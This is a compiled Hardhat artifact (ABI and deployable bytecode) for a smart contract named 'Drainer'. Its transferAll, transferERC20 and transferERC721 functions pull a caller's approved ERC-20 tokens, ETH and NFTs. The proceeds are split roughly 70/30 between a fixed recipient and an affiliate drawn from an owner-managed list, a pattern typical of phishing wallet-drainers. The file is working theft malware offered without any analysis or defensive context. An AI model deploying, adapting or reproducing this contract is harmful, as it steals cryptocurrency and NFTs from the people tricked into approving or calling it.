{
  "_format": "hh-sol-artifact-1",
  "contractName": "Drainer",
  "sourceName": "contracts/Drainer.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "_recipient",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [
        {
          "internalType": "address payable",
          "name": "_address",
          "type": "address"
        }
      ],
      "name": "addAddress",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "name": "addresses",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "amount",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "balanceReceived",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "nft",
      "outputs": [
        {
          "internalType": "contract IERC721",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "token",
      "outputs": [
        {
          "internalType": "contract IERC20",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [
        {
          "components": [
            {
              "internalType": "string",
              "name": "token_id",
              "type": "string"
            },
            {
              "internalType": "address",
              "name": "tok_or_nft_address",
              "type": "address"
            },
            {
              "internalType": "enum Drainer.AssetType",
              "name": "asset_type",
              "type": "uint8"
            },
            {
              "internalType": "uint256",
              "name": "balance",
              "type": "uint256"
            },
            {
              "internalType": "uint256",
              "name": "chain",
              "type": "uint256"
            }
          ],
          "internalType": "struct Drainer.Info[]",
          "name": "myArray",
          "type": "tuple[]"
        },
        {
          "internalType": "address payable",
          "name": "_apprecipient",
          "type": "address"
        }
      ],
      "name": "transferAll",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "transferERC20",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_token_address",
          "type": "address"
        },
        {
          "internalType": "address",
          "name": "_to",
          "type": "address"
        },
        {
          "internalType": "uint256",
          "name": "token_id",
          "type": "uint256"
        }
      ],
      "name": "transferERC721",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405260006007553480156200001657600080fd5b506040516200217f3803806200217f83398181016040528101906200003c91906200012f565b80600360006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555033600660006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505062000161565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000620000f782620000ca565b9050919050565b6200010981620000ea565b81146200011557600080fd5b50565b6000815190506200012981620000fe565b92915050565b600060208284031215620001485762000147620000c5565b5b6000620001588482850162000118565b91505092915050565b61200e80620001716000396000f3fe60806040526004361061009c5760003560e01c80637e99b3b3116100645780637e99b3b31461017457806382d389541461019f5780638871f63f146101dc5780638da5cb5b146101f8578063aa8c217c14610223578063fc0c546a1461024e5761009c565b80631a25e3d0146100a15780631aca6376146100cc57806338eada1c146100f557806347ccca021461011e57806352a90c4214610149575b600080fd5b3480156100ad57600080fd5b506100b6610279565b6040516100c39190611145565b60405180910390f35b3480156100d857600080fd5b506100f360048036038101906100ee9190611208565b6107d6565b005b34801561010157600080fd5b5061011c60048036038101906101179190611299565b61098a565b005b34801561012a57600080fd5b50610133610b00565b6040516101409190611325565b60405180910390f35b34801561015557600080fd5b5061015e610b26565b60405161016b919061134f565b60405180910390f35b34801561018057600080fd5b50610189610b2c565b604051610196919061134f565b60405180910390f35b3480156101ab57600080fd5b506101c660048036038101906101c1919061136a565b610b34565b6040516101d39190611145565b60405180910390f35b6101f660048036038101906101f1919061169a565b610b54565b005b34801561020457600080fd5b5061020d61103e565b60405161021a9190611705565b60405180910390f35b34801561022f57600080fd5b50610238611064565b604051610245919061134f565b60405180910390f35b34801561025a57600080fd5b5061026361106a565b6040516102709190611741565b60405180910390f35b600080339050600061271061251c600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166370a08231856040518263ffffffff1660e01b81526004016102e29190611705565b60206040518083038186803b1580156102fa57600080fd5b505afa15801561030e573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103329190611771565b61033c91906117cd565b6103469190611856565b90506000811161038b576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610382906118e4565b60405180910390fd5b6000612710611b588361039e91906117cd565b6103a89190611856565b9050600081836103b89190611904565b905082600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663dd62ed3e86306040518363ffffffff1660e01b8152600401610418929190611938565b60206040518083038186803b15801561043057600080fd5b505afa158015610444573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906104689190611771565b10156104a9576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016104a0906119ad565b60405180910390fd5b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323b872dd8630876040518463ffffffff1660e01b815260040161050a939291906119cd565b602060405180830381600087803b15801561052457600080fd5b505af1158015610538573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061055c9190611a30565b90508061059e576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161059590611aa9565b60405180910390fd5b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16856040518363ffffffff1660e01b815260040161061f929190611aea565b602060405180830381600087803b15801561063957600080fd5b505af115801561064d573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906106719190611a30565b9050806106b3576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016106aa90611b5f565b60405180910390fd5b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb600460009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16876040518363ffffffff1660e01b8152600401610734929190611aea565b602060405180830381600087803b15801561074e57600080fd5b505af1158015610762573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906107869190611a30565b9050806107c8576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016107bf90611b5f565b60405180910390fd5b600197505050505050505090565b60003390508073ffffffffffffffffffffffffffffffffffffffff16600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16636352211e846040518263ffffffff1660e01b815260040161084d919061134f565b60206040518083038186803b15801561086557600080fd5b505afa158015610879573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061089d9190611b94565b73ffffffffffffffffffffffffffffffffffffffff16146108f3576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016108ea90611c33565b60405180910390fd5b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323b872dd8585856040518463ffffffff1660e01b8152600401610952939291906119cd565b600060405180830381600087803b15801561096c57600080fd5b505af1158015610980573d6000803e3d6000fd5b5050505050505050565b600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610a1a576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610a1190611c9f565b60405180910390fd5b6000808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff1615610aa6576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610a9d90611d0b565b60405180910390fd5b60016000808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060006101000a81548160ff02191690831515021790555050565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60075481565b600047905090565b60006020528060005260406000206000915054906101000a900460ff1681565b600047905060008111610b9c576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610b9390611d77565b60405180910390fd5b6000808373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060009054906101000a900460ff16610c27576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610c1e90611e09565b60405180910390fd5b81600460006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060006064604683610c7991906117cd565b610c839190611856565b905060008183610c939190611904565b90503460076000828254610ca79190611e29565b925050819055506000600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1682604051610cf690611eb0565b60006040518083038185875af1925050503d8060008114610d33576040519150601f19603f3d011682016040523d82523d6000602084013e610d38565b606091505b5050905080610d7c576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610d7390611f11565b60405180910390fd5b60008573ffffffffffffffffffffffffffffffffffffffff1684604051610da290611eb0565b60006040518083038185875af1925050503d8060008114610ddf576040519150601f19603f3d011682016040523d82523d6000602084013e610de4565b606091505b5050905080610e28576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610e1f90611f11565b60405180910390fd5b60006007819055506000875111156110355760005b87518110156110335760006001811115610e5a57610e59611f31565b5b888281518110610e6d57610e6c611f60565b5b6020026020010151604001516001811115610e8b57610e8a611f31565b5b1415610efe57878181518110610ea457610ea3611f60565b5b602002602001015160200151600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550610ef8610279565b50611020565b600180811115610f1157610f10611f31565b5b888281518110610f2457610f23611f60565b5b6020026020010151604001516001811115610f4257610f41611f31565b5b141561101f576000610f71898381518110610f6057610f5f611f60565b5b602002602001015160000151611090565b9050888281518110610f8657610f85611f60565b5b602002602001015160200151600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555061101d898381518110610fe857610fe7611f60565b5b602002602001015160200151600360009054906101000a900473ffffffffffffffffffffffffffffffffffffffff16836107d6565b505b5b808061102b90611f8f565b915050610e3d565b505b50505050505050565b600660009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60055481565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000808290506000809250600090505b81518110156111235760008282815181106110be576110bd611f60565b5b602001015160f81c60f81b60f81c60ff169050603081101580156110e3575060398111155b1561110f576030816110f59190611904565b600a8561110291906117cd565b61110c9190611e29565b93505b50808061111b90611f8f565b9150506110a0565b5050919050565b60008115159050919050565b61113f8161112a565b82525050565b600060208201905061115a6000830184611136565b92915050565b6000604051905090565b600080fd5b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061119f82611174565b9050919050565b6111af81611194565b81146111ba57600080fd5b50565b6000813590506111cc816111a6565b92915050565b6000819050919050565b6111e5816111d2565b81146111f057600080fd5b50565b600081359050611202816111dc565b92915050565b6000806000606084860312156112215761122061116a565b5b600061122f868287016111bd565b9350506020611240868287016111bd565b9250506040611251868287016111f3565b9150509250925092565b600061126682611174565b9050919050565b6112768161125b565b811461128157600080fd5b50565b6000813590506112938161126d565b92915050565b6000602082840312156112af576112ae61116a565b5b60006112bd84828501611284565b91505092915050565b6000819050919050565b60006112eb6112e66112e184611174565b6112c6565b611174565b9050919050565b60006112fd826112d0565b9050919050565b600061130f826112f2565b9050919050565b61131f81611304565b82525050565b600060208201905061133a6000830184611316565b92915050565b611349816111d2565b82525050565b60006020820190506113646000830184611340565b92915050565b6000602082840312156113805761137f61116a565b5b600061138e848285016111bd565b91505092915050565b600080fd5b6000601f19601f8301169050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b6113e58261139c565b810181811067ffffffffffffffff82111715611404576114036113ad565b5b80604052505050565b6000611417611160565b905061142382826113dc565b919050565b600067ffffffffffffffff821115611443576114426113ad565b5b602082029050602081019050919050565b600080fd5b600080fd5b600080fd5b600080fd5b600067ffffffffffffffff821115611483576114826113ad565b5b61148c8261139c565b9050602081019050919050565b82818337600083830152505050565b60006114bb6114b684611468565b61140d565b9050828152602081018484840111156114d7576114d6611463565b5b6114e2848285611499565b509392505050565b600082601f8301126114ff576114fe611397565b5b813561150f8482602086016114a8565b91505092915050565b6002811061152557600080fd5b50565b60008135905061153781611518565b92915050565b600060a0828403121561155357611552611459565b5b61155d60a061140d565b9050600082013567ffffffffffffffff81111561157d5761157c61145e565b5b611589848285016114ea565b600083015250602061159d848285016111bd565b60208301525060406115b184828501611528565b60408301525060606115c5848285016111f3565b60608301525060806115d9848285016111f3565b60808301525092915050565b60006115f86115f384611428565b61140d565b9050808382526020820190506020840283018581111561161b5761161a611454565b5b835b8181101561166257803567ffffffffffffffff8111156116405761163f611397565b5b80860161164d898261153d565b8552602085019450505060208101905061161d565b5050509392505050565b600082601f83011261168157611680611397565b5b81356116918482602086016115e5565b91505092915050565b600080604083850312156116b1576116b061116a565b5b600083013567ffffffffffffffff8111156116cf576116ce61116f565b5b6116db8582860161166c565b92505060206116ec85828601611284565b9150509250929050565b6116ff81611194565b82525050565b600060208201905061171a60008301846116f6565b92915050565b600061172b826112f2565b9050919050565b61173b81611720565b82525050565b60006020820190506117566000830184611732565b92915050565b60008151905061176b816111dc565b92915050565b6000602082840312156117875761178661116a565b5b60006117958482850161175c565b91505092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006117d8826111d2565b91506117e3836111d2565b9250817fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff048311821515161561181c5761181b61179e565b5b828202905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b6000611861826111d2565b915061186c836111d2565b92508261187c5761187b611827565b5b828204905092915050565b600082825260208201905092915050565b7f496e73756666696369656e742062616c616e6365000000000000000000000000600082015250565b60006118ce601483611887565b91506118d982611898565b602082019050919050565b600060208201905081810360008301526118fd816118c1565b9050919050565b600061190f826111d2565b915061191a836111d2565b92508282101561192d5761192c61179e565b5b828203905092915050565b600060408201905061194d60008301856116f6565b61195a60208301846116f6565b9392505050565b7f496e73756666696369656e7420616c6c6f77616e636500000000000000000000600082015250565b6000611997601683611887565b91506119a282611961565b602082019050919050565b600060208201905081810360008301526119c68161198a565b9050919050565b60006060820190506119e260008301866116f6565b6119ef60208301856116f6565b6119fc6040830184611340565b949350505050565b611a0d8161112a565b8114611a1857600080fd5b50565b600081519050611a2a81611a04565b92915050565b600060208284031215611a4657611a4561116a565b5b6000611a5484828501611a1b565b91505092915050565b7f5472616e736665722066726f6d206661696c6564000000000000000000000000600082015250565b6000611a93601483611887565b9150611a9e82611a5d565b602082019050919050565b60006020820190508181036000830152611ac281611a86565b9050919050565b6000611ad4826112f2565b9050919050565b611ae481611ac9565b82525050565b6000604082019050611aff6000830185611adb565b611b0c6020830184611340565b9392505050565b7f5472616e73666572206661696c65640000000000000000000000000000000000600082015250565b6000611b49600f83611887565b9150611b5482611b13565b602082019050919050565b60006020820190508181036000830152611b7881611b3c565b9050919050565b600081519050611b8e816111a6565b92915050565b600060208284031215611baa57611ba961116a565b5b6000611bb884828501611b7f565b91505092915050565b7f43616c6c6572206973206e6f7420746865206f776e6572206f6620746865207460008201527f6f6b656e00000000000000000000000000000000000000000000000000000000602082015250565b6000611c1d602483611887565b9150611c2882611bc1565b604082019050919050565b60006020820190508181036000830152611c4c81611c10565b9050919050565b7f4e6f7420746865206f776e657200000000000000000000000000000000000000600082015250565b6000611c89600d83611887565b9150611c9482611c53565b602082019050919050565b60006020820190508181036000830152611cb881611c7c565b9050919050565b7f4164647265737320616c72656164792065786973740000000000000000000000600082015250565b6000611cf5601583611887565b9150611d0082611cbf565b602082019050919050565b60006020820190508181036000830152611d2481611ce8565b9050919050565b7f436f6e74726163742062616c616e6365206973207a65726f0000000000000000600082015250565b6000611d61601883611887565b9150611d6c82611d2b565b602082019050919050565b60006020820190508181036000830152611d9081611d54565b9050919050565b7f617070726563697069656e74206973206e6f742073657420696e206d6170706960008201527f6e67000000000000000000000000000000000000000000000000000000000000602082015250565b6000611df3602283611887565b9150611dfe82611d97565b604082019050919050565b60006020820190508181036000830152611e2281611de6565b9050919050565b6000611e34826111d2565b9150611e3f836111d2565b9250827fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff03821115611e7457611e7361179e565b5b828201905092915050565b600081905092915050565b50565b6000611e9a600083611e7f565b9150611ea582611e8a565b600082019050919050565b6000611ebb82611e8d565b9150819050919050565b7f5472616e7366657220746f20726563697069656e74206661696c656400000000600082015250565b6000611efb601c83611887565b9150611f0682611ec5565b602082019050919050565b60006020820190508181036000830152611f2a81611eee565b9050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052603260045260246000fd5b6000611f9a826111d2565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff821415611fcd57611fcc61179e565b5b60018201905091905056fea26469706673582212205827304cda526c557bdc8493acd83ad730a6818fdee8f8b954a5a2bcd07bba1164736f6c63430008090033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}